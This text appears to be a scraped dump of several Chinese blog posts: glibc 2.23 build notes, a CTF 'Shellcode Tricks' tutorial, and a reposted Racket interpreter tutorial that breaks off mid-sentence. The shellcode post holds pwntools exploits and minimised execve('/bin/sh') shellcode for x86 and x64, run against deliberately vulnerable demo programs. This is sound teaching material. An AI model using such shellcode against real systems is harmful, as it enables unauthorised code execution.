如果没有任何意外的话就能直接make &amp;&amp; make install编译了。下面记录一下遇到的几个坑。（感谢n132 大哥的博客） 0x0 某些安装包缺失configure 的时候提示有些安装包缺失，不能生成 Makefile： 123configure: error:*** These critical programs are missing or too old: gawk*** Check the INSTALL file for required versions. 根据提示安装一下即可： 1sudo apt-get update &amp;&amp; sudo apt-get install gawk 0x1 警告提示1234567891011121314In file included from regex.c:67:0:regexec.c: In function ‘check_node_accept_bytes’:regexec.c:3856:29: error: ‘extra’ may be used uninitialized in this function [-Werror=maybe-uninitialized] const unsigned char *coll_sym = extra + cset-&gt;coll_syms[i]; ^cc1: all warnings being treated as errors../o-iterator.mk:9: recipe for target &apos;/home/assassinq/glibc-2.23/build/posix/regex.o&apos; failedmake[2]: *** [/home/assassinq/glibc-2.23/build/posix/regex.o] Error 1make[2]: Leaving directory &apos;/home/assassinq/glibc-2.23/posix&apos;Makefile:214: recipe for target &apos;posix/subdir_lib&apos; failedmake[1]: *** [posix/subdir_lib] Error 2make[1]: Leaving directory &apos;/home/assassinq/glibc-2.23&apos;Makefile:9: recipe for target &apos;all&apos; failedmake: *** [all] Error 2 cc1: all warnings being treated as errors是因为设置了警告提示，这里可以回到之前 configure 的时候，CFLAGS新增加一个参数-Wno-error来去除警告： 1CFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og -Wno-error\" 0x2 ld.so.conf缺失12/home/assassinq/glibc-2.23/build/elf/ldconfig: Warning: ignoring configuration file that cannot be opened: /home/assassinq/glibc-2.23/64/etc/ld.so.conf: No such file or directorymake[1]: Leaving directory &apos;/home/assassinq/glibc-2.23&apos; 这里只需要直接 touch 一个新文件即可： 1cd ../64/etc &amp;&amp; sudo touch ld.so.conf 调试记录一下调_dl_runtime_resolve的 Makefile： 123all: aa: a.c gcc a.c -o a -Wl, -dynamic-linker /path/to/install/lib/ld-2.23.so -g 参考网站https://n132.github.io/2018/04/30/2018-04-30-%E7%BC%96%E8%AF%91-Libc-2-23/https://www.youtube.com/watch?v=wsIvqd9YqTI&amp;feature=share","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"blog.b3ale.cn/tags/linux/"}]},{"title":"Shellcode Tricks","slug":"[TODO]Shellcode-Tricks","date":"2019-03-02T11:05:59.000Z","updated":"2020-02-09T08:47:33.035Z","comments":true,"path":"2019/03/02/[TODO]Shellcode-Tricks/","link":"","permalink":"blog.b3ale.cn/2019/03/02/[TODO]Shellcode-Tricks/","excerpt":"The Splendid Shellcode.","text":"The Splendid Shellcode. Shellcode 是一串可以直接被执行的机器码，可以用来获得 Shell。NX（DEP）（No eXecute）即可写不可执行、可执行不可写。 可以控制程序执行流，可以控制一定的 data； 利用mprotect()或者_dl_make_stack_executable()改写某些区域的 porc 再执行。 关于 System Call： 1sys_execve( const char *filename, char *const argv[], char *const envp[] ); 目标： 1execve(\"/bin/sh\", 0, 0); System Call x86： eax ebx ecx edx else 0xb addr of “/bin/sh” 0 0 int 0x80 System Call x64： rax rdi rsi rdx else 59 addr of “/bin/sh” 0 0 syscall Basic Shellcode最基础的 shellcode，对输入的长度没有做任何限制。 shellcodeSource Code： 12345678910// gcc main.c -m32 -z execstack -o main#include &lt;stdio.h&gt;int main() &#123; void (*ptr)(); char buf[0x20]; puts(\"shellcode&gt;&gt;\"); read(0, buf, 0x20); ptr = buf; ptr();&#125; push 字符串&quot;/bin/sh&quot;，此时 esp 指向字符串，即直接把 esp 的值赋给 ebx 即可。&quot;/bin/sh&quot;的值可以在 gdb 调试中searchmem /bin/sh得到。Shellcode 的长度为 29。 Exploit： 123456789101112131415161718#!/usr/bin/env pythonfrom pwn import *p = process('./main')context.arch = 'i386'sh = asm(''' mov eax, 0xb mov ecx, 0 mov edx, 0 push 0x68732f push 0x6e69622f mov ebx, esp int 0x80''')info(disasm(sh))info(len(sh))# gdb.attach(p)p.sendafter('shellcode&gt;&gt;\\n', sh.ljust(0x20))p.interactive() shellcode64Source Code： 12345678910// gcc main.c -z execstack -o main#include &lt;stdio.h&gt;int main() &#123; void (*ptr)(); char buf[0x40]; puts(\"shellcode&gt;&gt;\"); read(0, buf, 0x40); ptr = buf; ptr();&#125; 64 位下不能直接 push 值，需要通过寄存器 push。Shellcode 的长度为 37 Exploit： 123456789101112131415161718#!/usr/bin/env pythonfrom pwn import *p = process('./main')context.arch = 'amd64'sh = asm(''' mov rax, 59 mov rsi, 0 mov rdx, 0 mov rdi, 0x68732f6e69622f push rdi mov rdi, rsp syscall''')info(disasm(sh))info(len(sh))# gdb.attach(p)p.sendafter('shellcode&gt;&gt;\\n', sh.ljust(0x40))p.interactive() Baby Shellcode对接受的字符串长度做了一点限制，需要通过一些 Tricks 来缩短 Shellcode 的长度。 shellcode_20Source Code： 12345678910// gcc main.c -m32 -z execstack -o main#include &lt;stdio.h&gt;int main() &#123; void (*ptr)(); char buf[0x20]; puts(\"shellcode&gt;&gt;\"); read(0, buf, 20); ptr = buf; ptr();&#125; 32 位下，mov ecx, 0是 5 个字节，而xor ecx, ecx只有 2 个字节，两者同样是给寄存器清零，后者可以省去 3 个字节。mov eax, 0xb同样需要 5 个字节，而在 eax 为 0 的情况下，我们只需要mov al, 0xb，只需要 2 个字节。mul ebx需要 2 个字节，其作用是将 eax 中值与 ebx 相乘，所得结果高位存在 edx，低位存在 eax。在调试中我们发现 ebx 的值为零，此时使用乘法指令可以直接使 eax 和 edx 的值变为 0，可以直接对 al 赋值，同时不用再对 edx 清零。最终 Shellcode 的长度缩短为 20 字节。 Exploit： 123456789101112131415161718#!/usr/bin/env pythonfrom pwn import *p = process('./main')context.arch = 'i386'sh = asm(''' mul ebx mov al, 0xb xor ecx, ecx push 0x0068732f push 0x6e69622f mov ebx, esp int 0x80''')info(disasm(sh))info(len(sh))gdb.attach(p)p.sendafter('shellcode&gt;&gt;\\n', sh.ljust(0x20, '\\x00'))p.interactive() shellcode64_22Source Code： 12345678910// gcc main.c -z execstack -o main#include &lt;stdio.h&gt;int main() &#123; void (*ptr)(); char buf[0x40]; puts(\"shellcode&gt;&gt;\"); read(0, buf, 22); ptr = buf; ptr();&#125; 调试中可以发现 rax 和 rbx 的值为 0，我们可以把 7 个字节的mov rax, 59缩短为 2 个字节的mov al, 59。同时清零 rdx 和 rsi 的工作可以通过 xor 来缩短成 3 个字节。然而，通过观察发现，64 位下只能通过寄存器的 push 只需要 1 个字节。如果用 push 和 pop，即push rbx ; pop rsi只需要 2 个字节。后面对 rdi 的赋值也可以通过同样的方式达到目的。最终 Shellcode 的长度缩短为 21 字节。 Exploit： 123456789101112131415161718192021#!/usr/bin/env pythonfrom pwn import *p = process('./main')context.arch = 'amd64'sh = asm(''' mov al, 59 push rbx push rbx pop rsi pop rdx mov rdi, 0x68732f6e69622f push rdi push rsp pop rdi syscall''')info(disasm(sh))info(len(sh))gdb.attach(p)p.sendafter('shellcode&gt;&gt;\\n', sh.ljust(0x40))p.interactive() Child ShellcodeorwTODO: Death NoteTODO: Adult ShellcodeAlive NoteTODO: Hell ShellcodeMnO2TODO:","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"【转】怎样写一个解释器","slug":"【转】怎样写一个解释器","date":"2019-02-28T05:34:20.000Z","updated":"2019-08-26T01:14:16.600Z","comments":true,"path":"2019/02/28/【转】怎样写一个解释器/","link":"","permalink":"blog.b3ale.cn/2019/02/28/【转】怎样写一个解释器/","excerpt":"转自王垠老师的博客","text":"转自王垠老师的博客 怎样写一个解释器写一个解释器，通常是设计和实现程序语言的第一步。解释器是简单却又深奥的东西，以至于好多人都不会写，所以我决定写一篇这方面的入门读物。 虽然我试图从最基本的原理讲起，尽量不依赖于其它知识，但这并不是一本编程入门教材。我假设你已经理解 Scheme 语言，以及基本的编程技巧（比如递归）。如果你完全不了解这些，那我建议你读一下 SICP 的第一，二章，或者 HtDP 的前几章，习题可以不做。注意不要读太多书，否则你就回不来了 ;-) 当然你也可以直接读这篇文章，有不懂的地方再去查资料。 实现语言容易犯的一个错误，就是一开头就试图去实现很复杂的语言（比如 JavaScript 或者 Python）。这样你很快就会因为这些语言的复杂性，以及各种历史遗留的设计问题而受到挫折，最后不了了之。学习实现语言，最好是从最简单，最干净的语言开始，迅速写出一个可用的解释器。之后再逐步往里面添加特性，同时保持正确。这样你才能有条不紊地构造出复杂的解释器。 因为这个原因，这篇文章只针对一个很简单的语言，名叫“R2”。它可以作为一个简单的计算器用，还具有变量定义，函数定义和调用等功能。 我们的工具：Racket本文的解释器是用 Scheme 语言实现的。Scheme 有很多的“实现”，这里我用的实现叫做 Racket，它可以在这里免费下载。为了让程序简洁，我用了一点点 Racket 的模式匹配（pattern matching）功能。我对 Scheme 的实现没有特别的偏好，但 Racket 方便易用，适合教学。如果你用其它的 Scheme 实现，可能得自己做一些调整。 Racket 具有宏（macro），所以它其实可以变成很多种语言。如果你之前用过 DrRacket，那它的“语言设置”可能被你改成了 R5RS 之类的。所以如果下面的程序不能运行，你可能需要检查一下 DrRacket 的“语言设置”，把 Language 设置成 “Racket”。 Racket 允许使用方括号而不只是圆括号，所以你可以写这样的代码： 123(let ([x 1] [y 2]) (+ x y)) 方括号跟圆括号可以互换，唯一的要求是方括号必须和方括号匹配。通常我喜欢用方括号来表示“无动作”的数据（比如上面的 [x 1], [y 2]），这样可以跟函数调用和其它具有“动作”的代码，产生“视觉差”。这对于代码的可读性是一个改善，因为到处都是圆括号的话，确实有点太单调，容易打瞌睡。 另外，Racket 程序的最上面都需要加上像 #lang racket 这样的语言选择标记，这样 Racket 才可以知道你想用哪个语言变种。 解释器是什么准备工作就到这里。现在我来谈一下，解释器到底是什么。说白了，解释器跟计算器差不多。解释器是一个函数，你输入一个“表达式”，它就输出一个 “值”，像这样： 比如，你输入表达式 ‘(+ 1 2) ，它就输出值，整数 3。表达式是一种“表象”或者“符号”，而值却更加接近“本质”或者“意义”。我们“解释”了符号，得到它的意义，这也许就是为什么它叫做“解释器”。 需要注意的是，表达式是一个数据结构，而不是一个字符串。我们用一种叫“S 表达式”（S-expression）的结构来存储表达式。比如表达式 ‘(+ 1 2) 其实是一个链表（list），它里面的内容是三个符号（symbol）：+, 1 和 2，而不是字符串”(+ 1 2)”。 从 S 表达式这样的“结构化数据”里提取信息，方便又可靠，而从字符串里提取信息，麻烦而且容易出错。Scheme（Lisp）语言里面大量使用结构化数据，少用字符串，这是 Lisp 系统比 Unix 系统先进的地方之一。 从计算理论的角度讲，每个程序都是一台机器的“描述”，而解释器就是在“模拟”这台机器的运转，也就是在进行“计算”。所以从某种意义上讲，解释器就是计算的本质。当然，不同的解释器就会带来不同的计算。 CPU 也是一个解释器，它专门解释执行机器语言。如果你深刻理解了解释器，就可以从本质上看出各种 CPU 的设计为什么是那个样子，它们有什么优缺点，而不只是被动的作为它们的使用者。 抽象语法树（Abstract Syntax Tree）用 S 表达式所表示的代码，本质上是一种叫做“树”（tree）的数据结构。更具体一点，这叫做“抽象语法树”（Abstract Syntax Tree，简称 AST）。下文为了简洁，我们省略掉“抽象”两个字，就叫它“语法树”。 跟普通的树结构一样，语法树里的节点，要么是一个“叶节点”，要么是一颗“子树”。叶节点是不能再细分的“原子”，比如数字，字符串，操作符，变量名。而子树是可以再细分的“结构”，比如算术表达式，函数定义，函数调用，等等。 举个简单的例子，表达式 ‘(* (+ 1 2) (+ 3 4))，就对应如下的语法树结构： 其中，，两个+，1，2，3，4 都是叶节点，而那三个红色节点，都表示子树结构：’(+ 1 2)，’(+ 3 4)，’( (+ 1 2) (+ 3 4))。 树遍历算法在基础的数据结构课程里，我们都学过二叉树的遍历操作，也就是所谓先序遍历，中序遍历和后序遍历。语法树跟二叉树，其实没有很大区别，所以你也可以在它上面进行遍历。解释器的算法，就是在语法树上的一种遍历操作。由于这个渊源关系，我们先来做一个遍历二叉树的练习。做好了之后，我们就可以把这段代码扩展成一个解释器。 这个练习是这样：写出一个函数，名叫 tree-sum，它对二叉树进行“求和”，把所有节点里的数加在一起，返回它们的和。举个例子，(tree-sum ‘((1 2) (3 4)))，执行后应该返回 10。注意：这是一颗二叉树，所以不会含有长度超过 2 的子树，你不需要考虑像 ((1 2) (3 4 5)) 这类情况。需要考虑的例子是像这样：(1 2)，(1 (2 3)), ((1 2) 3) ((1 2) (3 4))，…… （为了达到最好的学习效果，你最好试一下写出这个函数再继续往下看。） 好了，希望你得到了跟我差不多的结果。我的代码是这个样子： 12345678910#lang racket(define tree-sum (lambda (exp) (match exp ; 对输入exp进行模式匹配 [(? number? x) x] ; exp是一个数x吗？如果是，那么返回这个数x [`(,e1 ,e2) ; exp是一个含有两棵子树的中间节点吗？ (let ([v1 (tree-sum e1)] ; 递归调用tree-sum自己，对左子树e1求值 [v2 (tree-sum e2)]) ; 递归调用tree-sum自己，对右子树e2求值 (+ v1 v2))]))) ; 返回左右子树结果v1和v2的和 你可以通过以下的例子来测试它的正确性： 12345678(tree-sum &apos;(1 2));; =&gt; 3(tree-sum &apos;(1 (2 3)));; =&gt; 6(tree-sum &apos;((1 2) 3));; =&gt; 6(tree-sum &apos;((1 2) (3 4)));; =&gt; 10 （完整的代码和示例，可以在这里下载。） 这个算法很简单，我们可以把它用文字描述如下： 如果输入 exp 是一个数，那就返回这个数。 否则如果 exp 是像 (,e1 ,e2) 这样的子树，那么分别对 e1 和 e2 递归调用 tree-sum，进行求和，得到 v1 和 v2，然后返回 v1 + v2 的和。你自己写出来的代码，也许用了 if 或者 cond 语句来进行分支，而我的代码里面使用的是 Racket 的模式匹配（match）。这个例子用 if 或者 cond 其实也可以，但我之后要把这代码扩展成一个解释器，所以提前使用了 match。这样跟后面的代码对比的时候，就更容易看出规律来。接下来，我就简单讲一下这个 match 表达式的工作原理。 模式匹配现在不得不插入一点 Racket 的技术细节，如果你已经学会使用 Racket 的模式匹配，可以跳过这一节。你也可以通过阅读 Racket 模式匹配的文档来代替这一节。但我建议你不要读太多文档，因为我接下去只用到很少的模式匹配功能，我把它们都解释如下。 模式匹配的形式一般是这样： 12345(match x [模式 结果] [模式 结果] ... ...) 它先对 x 求值，然后根据值的结构来进行分支。每个分支由两部分组成，左边是一个模式，右边是一个结果。整个 match 语句的语义是这样：从上到下依次考虑，找到第一个可以匹配 x 的值的模式，返回它右边的结果。左边的模式在匹配之后，可能会绑定一些变量，这些变量可以在右边的表达式里使用。 模式匹配是一种分支语句，它在逻辑上就是 Scheme（Lisp） 的 cond 表达式，或者 Java 的嵌套条件语句 if … else if … else …。然而跟条件语句里的“条件”不同，每条 match 语句左边的模式，可以准确而形象地描述数据结构的形状，而且可以在匹配的同时，对结构里的成员进行“绑定”。这样我们可以在右边方便的访问结构成员，而不需要使用访问函数（accessor）或者 foo.x 这样的属性语法（attribute）。而且模式可以有嵌套的子结构，所以它能够一次性的表示复杂的数据结构。 举个实在点的例子。我的代码里用了这样一个 match 表达式： 123456(match exp [(? number? x) x] [`(,e1 ,e2) (let ([v1 (tree-sum e1)] [v2 (tree-sum e2)]) (+ v1 v2))]) 第二行里面的 ‘(,e1 ,e2) 是一个模式（pattern），它被用来匹配 exp 的值。如果 exp 是 ‘(1 2)，那么它与’(,e1 ,e2)匹配的时候，就会把 e1 绑定到 ‘1，把 e2 绑定到 ‘2。这是因为它们结构相同： 12`(,e1 ,e2)&apos;( 1 2) 说白了，模式就是一个可以含有“名字”（像 e1 和 e2）的结构，像 ‘(,e1 ,e2)。我们拿这个带有名字的结构，去匹配实际数据，像 ‘(1 2)。当它们一一对应之后，这些名字就被绑定到数据里对应位置的值。 第一行的“模式”比较特殊，(? number? x) 表示的，其实是一个普通的条件判断，相当于 (number? exp)，如果这个条件成立，那么它把 exp 的值绑定到 x，这样右边就可以用 x 来指代 exp。对于无法细分的结构（比如数字，布尔值），你只能用这种方式来“匹配”。看起来有点奇怪，不过习惯了就好了。 模式匹配对解释器和编译器的书写相当有用，因为程序的语法树往往具有嵌套的结构。不用模式匹配的话，往往要写冗长，复杂，不直观的代码，才能描述出期望的结构。而且由于结构的嵌套比较深，很容易漏掉边界情况，造成错误。模式匹配可以直观的描述期望的结构，避免漏掉边界情况，而且可以方便的访问结构成员。 由于这个原因，很多源于 ML 的语言（比如 OCaml，Haskell）都有模式匹配的功能。因为 ML（Meta-Language）原来设计的用途，就是用来实现程序语言的。Racket 的模式匹配也是部分受了 ML 的启发，实际上它们的原理是一模一样的。 好了，树遍历的练习就做到这里。然而这跟解释器有什么关系呢？下面我们只把它改一下，就可以得到一个简单的解释器。 一个计算器计算器也是一种解释器，只不过它只能处理算术表达式。我们的下一个目标，就是写出一个计算器。如果你给它 ‘(* (+ 1 2) (+ 3 4))，它就输出 21。可不要小看这个计算器，稍后我们把它稍加改造，就可以得到一个更多功能的解释器。 上面的代码里，我们利用递归遍历，对树里的数字求和。那段代码里，其实已经隐藏了一个解释器的框架。你观察一下，一个算术表达式 ‘(_ (+ 1 2) (+ 3 4))，跟二叉树 ‘((1 2) (3 4)) 有什么不同？发现没有，这个算术表达式比起二叉树，只不过在每个子树结构里多出了一个操作符：一个 _ 和两个 + 。它不再是一棵二叉树，而是一种更通用的树结构。 这点区别，也就带来了二叉树求和与解释器算法的区别。对二叉树进行求和的时候，在每个子树节点，我们都做加法。而对表达式进行解释的时候，在每一个子树节点，我们不一定进行加法。根据子树的“操作符”不同，我们可能会选择加，减，乘，除四种操作。 好了，下面就是这个计算器的代码。它接受一个表达式，输出一个数字作为结果。 1234567891011121314#lang racket ; 声明用 Racket 语言(define calc (lambda (exp) (match exp ; 分支匹配：表达式的两种情况 [(? number? x) x] ; 是数字，直接返回 [`(,op ,e1 ,e2) ; 匹配提取操作符op和两个操作数e1,e2 (let ([v1 (calc e1)] ; 递归调用 calc 自己，得到 e1 的值 [v2 (calc e2)]) ; 递归调用 calc 自己，得到 e2 的值 (match op ; 分支匹配：操作符 op 的 4 种情况 [&apos;+ (+ v1 v2)] ; 如果是加号，输出结果为 (+ v1 v2) [&apos;- (- v1 v2)] ; 如果是减号，乘号，除号，相似的处理 [&apos;* (* v1 v2)] [&apos;/ (/ v1 v2)]))]))) 你可以得到如下的结果： 123456(calc &apos;(+ 1 2));; =&gt; 3(calc &apos;(* 2 3));; =&gt; 6(calc &apos;(* (+ 1 2) (+ 3 4)));; =&gt; 21 （完整的代码和示例，可以在这里下载。） 跟之前的二叉树求和代码比较一下，你会发现它们惊人的相似，因为解释器本来就是一个树遍历算法。不过你发现它们有什么不同吗？它们的不同点在于： 算术表达式的模式里面，多出了一个“操作符”（op）叶节点：(,op ,e1 ,e2) 对子树 e1 和 e2 分别求值之后，我们不是返回 (+ v1 v2)，而是根据 op 的不同，返回不同的结果： 12345(match op [&apos;+ (+ v1 v2)] [&apos;- (- v1 v2)] [&apos;* (* v1 v2)] [&apos;/ (/ v1 v2)]) 最后你发现，一个算术表达式的解释器，不过是一个稍加扩展的树遍历算法。 R2：一个很小的程序语言实现了一个计算器，现在让我们过渡到一种更强大的语言。为了方便称呼，我给它起了一个萌萌哒名字，叫 R2。R2 比起之前的计算器，只多出四个元素，它们分别是：变量，函数，绑定，调用。再加上之前介绍的算术操作，我们就得到一个很简单的程序语言，它只有 5 种不同的构造。用 Scheme 的语法，这 5 种构造看起来就像这样： 变量：x 函数：(lambda (x) e) 绑定：(let ([x e1]) e2) 调用：(e1 e2) 算术：(• e2 e2)（其中，• 是一个算术操作符，可以选择 +, -, *, / 其中之一） 一般程序语言还有很多其它构造，可是一开头就试图去实现所有那些，只会让人糊涂。最好是把这少数几个东西搞清楚，确保它们正确之后，才慢慢加入其它元素。 这些构造的语义，跟 Scheme 里面的同名构造几乎一模一样。如果你不清楚什么是”绑定“，那你可以把它看成是普通语言里的”变量声明“。 需要注意的是，跟一般语言不同，我们的函数只接受一个参数。这不是一个严重的限制，因为在我们的语言里，函数可以被作为值传递，也就是所谓“first-class function”。所以你可以用嵌套的函数定义来表示有两个以上参数的函数。 举个例子， (lambda (x) (lambda (y) (+ x y))) 是个嵌套的函数定义，它也可以被看成是有两个参数（x 和 y）的函数，这个函数返回 x 和 y 的和。当这样的函数被调用的时候，需要两层调用，就像这样： 12(((lambda (x) (lambda (y) (+ x y))) 1) 2);; =&gt; 3 这种做法在 PL 术语里面，叫做咖喱（currying）。看起来啰嗦，但这样我们的解释器可以很简单。等我们理解了基本的解释器，再实现真正的多参数函数也不迟。 另外，我们的绑定语法 (let ([x e1]) e2)，比起 Scheme 的绑定也有一些局限。我们的 let 只能绑定一个变量，而 Scheme 可以绑定多个，像这样 (let ([x 1][y 2]) (+ x y))。这也不是一个严重的限制，因为我们可以啰嗦一点，用嵌套的 let 绑定： 123(let ([x 1]) (let ([y 2]) (+ x y))) R2 的解释器下面是我们今天要完成的解释器，它可以运行一个 R2 程序。你可以先留意一下各部分的注释。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#lang racket;;; 以下三个定义 env0, ext-env, lookup 是对环境（environment）的基本操作：;; 空环境(define env0 &apos;());; 扩展。对环境 env 进行扩展，把 x 映射到 v，得到一个新的环境(define ext-env (lambda (x v env) (cons `(,x . ,v) env)));; 查找。在环境中 env 中查找 x 的值。如果没找到就返回 #f(define lookup (lambda (x env) (let ([p (assq x env)]) (cond [(not p) #f] [else (cdr p)]))));; 闭包的数据结构定义，包含一个函数定义 f 和它定义时所在的环境(struct Closure (f env));; 解释器的递归定义（接受两个参数，表达式 exp 和环境 env）;; 共 5 种情况（变量，函数，绑定，调用，数字，算术表达式）(define interp (lambda (exp env) (match exp ; 对exp进行模式匹配 [(? symbol? x) ; 变量 (let ([v (lookup x env)]) (cond [(not v) (error &quot;undefined variable&quot; x)] [else v]))] [(? number? x) x] ; 数字 [`(lambda (,x) ,e) ; 函数 (Closure exp env)] [`(let ([,x ,e1]) ,e2) ; 绑定 (let ([v1 (interp e1 env)]) (interp e2 (ext-env x v1 env)))] [`(,e1 ,e2) ; 调用 (let ([v1 (interp e1 env)] [v2 (interp e2 env)]) (match v1 [(Closure `(lambda (,x) ,e) env-save) (interp e (ext-env x v2 env-save))]))] [`(,op ,e1 ,e2) ; 算术表达式 (let ([v1 (interp e1 env)] [v2 (interp e2 env)]) (match op [&apos;+ (+ v1 v2)] [&apos;- (- v1 v2)] [&apos;* (* v1 v2)] [&apos;/ (/ v1 v2)]))])));; 解释器的“用户界面”函数。它把 interp 包装起来，掩盖第二个参数，初始值为 env0(define r2 (lambda (exp) (interp exp env0))) 这里有一些测试例子： 123456789101112131415161718192021222324252627(r2 &apos;(+ 1 2));; =&gt; 3(r2 &apos;(* 2 3));; =&gt; 6(r2 &apos;(* 2 (+ 3 4)));; =&gt; 14(r2 &apos;(* (+ 1 2) (+ 3 4)));; =&gt; 21(r2 &apos;((lambda (x) (* 2 x)) 3));; =&gt; 6(r2&apos;(let ([x 2]) (let ([f (lambda (y) (* x y))]) (f 3))));; =&gt; 6(r2&apos;(let ([x 2]) (let ([f (lambda (y) (* x y))]) (let ([x 4]) (f 3)))));; =&gt; 6 （完整的代码和示例，可以在这里下载。) 在接下来的几节，我们来仔细看看这个解释器的各个部分。 对基本算术操作的解释算术操作一般都是程序里最基本的构造，它们不能再被细分为多个步骤，所以我们先来看看对算术操作的处理。以下就是 R2 解释器处理算术的部分，它是 interp 的最后一个分支。 12345678910(match exp ... ... [`(,op ,e1 ,e2) (let ([v1 (interp e1 env)] ; 递归调用 interp 自己，得到 e1 的值 [v2 (interp e2 env)]) ; 递归调用 interp 自己，得到 e2 的值 (match op ; 分支：处理操作符 op 的 4 种情况 [&apos;+ (+ v1 v2)] ; 如果是加号，输出结果为 (+ v1 v2) [&apos;- (- v1 v2)] ; 如果是减号，乘号，除号，相似的处理 [&apos;* (* v1 v2)] [&apos;/ (/ v1 v2)]))]) 你可以看到它几乎跟刚才写的计算器一模一样，不过现在 interp 的调用多了一个参数 env 而已。这个 env 是所谓“环境”，我们下面很快就讲。 对数字的解释对数字的解释很简单，把它们原封不动返回就可以了。 [(? number? x) x] 变量和函数变量和函数是解释器里最麻烦的部分，所以我们来仔细看看。 变量（variable）的产生，是数学史上的最大突破之一。因为变量可以被绑定到不同的值，从而使函数的实现成为可能。比如数学函数 f(x) = x _ 2，其中 x 是一个变量，它把输入的值传递到函数体 x _ 2 里面。如果没有变量，函数就不可能实现。 对变量最基本的操作，是对它的“绑定”（binding）和“取值”（evaluate）。什么是绑定呢？拿上面的函数 f(x) 作为例子。当我们调用 f(1) 时，函数体里面的 x 等于 1，所以 x _ 2 的值是 2，而当我们调用 f(2) 时，函数体里面的 x 等于 2，所以 x _ 2 的值是 4。这里，两次对 f 的调用，分别对 x 进行了两次绑定。第一次 x 被绑定到了 1，第二次被绑定到了 2。 你可以把“绑定”理解成这样一个动作，就像当你把插头插进电源插座的那一瞬间。插头的插脚就是 f(x) 里面的那个 x，而 x * 2 里面的 x，则是电线的另外一端。所以当你把插头插进插座，电流就通过这根电线到达另外一端。如果电线导电性能良好，两头的电压应该相等。 环境我们的解释器只能一步一步的做事情。比如，当它需要求 f(1) 的值的时候，它分成两步操作： 把 x 绑定到 1，这样函数体内才能看见这个绑定。 进入 f 的函数体，对 x * 2 进行求值。 这就像一个人做出这两个动作： 把插头插进插座 。 到电线的另外一头，测量它的电压，并且把结果乘以 2。 在第一步和第二步之间，我们如何记住 x 的值呢？通过所谓“环境”！我们用环境记录变量的值，并且把它们传递到变量的“可见区域”。变量的可见区域，用术语说叫做“作用域”（scope）。 在我们的解释器里，用于处理环境的代码如下： 123456789101112131415;; 空环境(define env0 &apos;());; 对环境 env 进行扩展，把 x 映射到 v(define ext-env (lambda (x v env) (cons `(,x . ,v) env)));; 取值。在环境中 env 中查找 x 的值(define lookup (lambda (x env) (let ([p (assq x env)]) (cond [(not p) #f] [else (cdr p)])))) 这里我们用一种最简单的数据结构，Scheme 的 association list，来表示环境。Association list 看起来像这个样子：((x . 1) (y . 2) (z . 5))。它是一个两元组（pair）的链表，左边的元素是 key，右边的元素是 value。写得直观一点就是： 123((x . 1) (y . 2) (z . 5)) 查表操作就是从头到尾搜索，如果左边的 key 是要找的变量，就返回整个 pair。简单吧？效率很低，但是足够完成我们现在的任务。 ext-env 函数扩展一个环境。比如，如果原来的环境 env1 是 ((y . 2) (x . 1)) 那么 (ext-env x 3 env1)，就会返回 ((x . 3) (y . 2) (x . 1))。也就是把 (x . 3) 加到 env1 的最前面去。 那我们什么时候需要扩展环境呢？当我们进行绑定的时候。绑定可能出现在函数调用时，也可能出现在 let 绑定时。我们选择的数据结构，使得环境自然而然的具有了作用域（scope）的特性。 环境其实是一个堆栈（stack）。内层的绑定，会出现在环境的最上面，这就是在“压栈”。这样我们查找变量的时候，会优先找到最内层定义的变量。 举个例子： 12345(let ([x 1]) ; env=&apos;()。绑定x到1。 (let ([y 2]) ; env=&apos;((x . 1))。绑定y到2。 (let ([x 3]) ; env=&apos;((y . 2) (x . 1))。绑定x到3。 (+ x y)))) ; env=&apos;((x . 3) (y . 2) (x . 1))。查找x，得到3；查找y，得到2。;; =&gt; 5 这段代码会返回 5。这是因为最内层的绑定，把 (x . 3) 放到了环境的最前面，这样查找 x 的时候，我们首先看到 (x . 3)，然后就返回值 3。之前放进去的 (x . 1) 仍然存在，但是我们先看到了最上面的那个(x . 3)，所以它被忽略了。 这并不等于说 (x . 1) 就可以被改写或者丢弃，因为它仍然是有用的。你只需要看一个稍微不同的例子，就知道这是怎么回事： 12345(let ([x 1]) ; env=&apos;()。绑定x到1。 (+ (let ([x 2]) ; env=&apos;((x . 1))。绑定x到2。 x) ; env=&apos;((x . 2) (x . 1))。查找x，得到2。 x)) ; env=&apos;((x . 1))。查找x，得到1。;; =&gt; 3 ; 两个不同的x的和，1+2等于3。 这个例子会返回 3。它是第 3 行和第 4 行里面两个 x 的和。由于第 3 行的 x 处于内层 let 里面，那里的环境是 ((x . 2) (x . 1))，所以查找 x 的值得到 2。第 4 行的 x 在内层 let 外面，但是在外层 let 里面，那里的环境是 ((x . 1))，所以查找 x 的值得到 1。这很符合直觉，因为 x 总是找到最内层的定义。 值得注意的是，环境被扩展以后，形成了一个新的环境，而原来的环境并没有被改变。比如，上面的 ((y . 2) (x . 1)) 并没有删除或者修改，只不过是被“引用”到一个更大的列表里去了。 这样不对已有数据进行修改（mutation）的数据结构，叫做“函数式数据结构”。函数式数据结构只生成新的数据，而不改变或者删除老的。它可能引用老的结构，然而却不改变老的结构。这种“不修改”（immutable）的性质，在我们的解释器里是很重要的，因为当我们扩展一个环境，进入递归，返回之后，外层的代码必须仍然可以访问原来外层的环境。 当然，我们也可以用另外的，更高效的数据结构（比如平衡树，串接起来的哈希表）来表示环境。如果你学究一点，甚至可以用函数来表示环境。这里为了代码简单，我们选择了最笨，然而正确，容易理解的数据结构。 对变量的解释了解了变量，函数和环境，我们来看看解释器对变量的“取值”操作，也就是 match 的第一种情况。 [(? symbol? x) (lookup x env)] 这就是在环境中，沿着从内向外的“作用域顺序”，查找变量的值。 这里的 (? symbol? x) 是一种特殊的模式，它使用 Scheme 函数 symbol? 来判断输入是否是一个符号，如果是，就把它绑定到 x，然后你就可以在右边用 x 来指称这个输入。 对绑定的解释现在我们来看看对 let 绑定的解释： 123[`(let ([,x ,e1]) ,e2) (let ([v1 (interp e1 env)]) ; 解释右边表达式e1，得到值v1 (interp e2 (ext-env x v1 env)))] ; 把(x . v1)扩充到环境顶部，对e2求值 通过代码里的注释，你也许已经可以理解它在做什么。我们先对表达式 e1 求值，得到 v1。然后我们把 (x . v1) 扩充到环境里，这样 (let ([x e1]) …) 内部都可以看到 x 的值。然后我们使用这个扩充后的环境，递归调用解释器本身，对 let 的主体 e2 求值。它的返回值就是这个 let 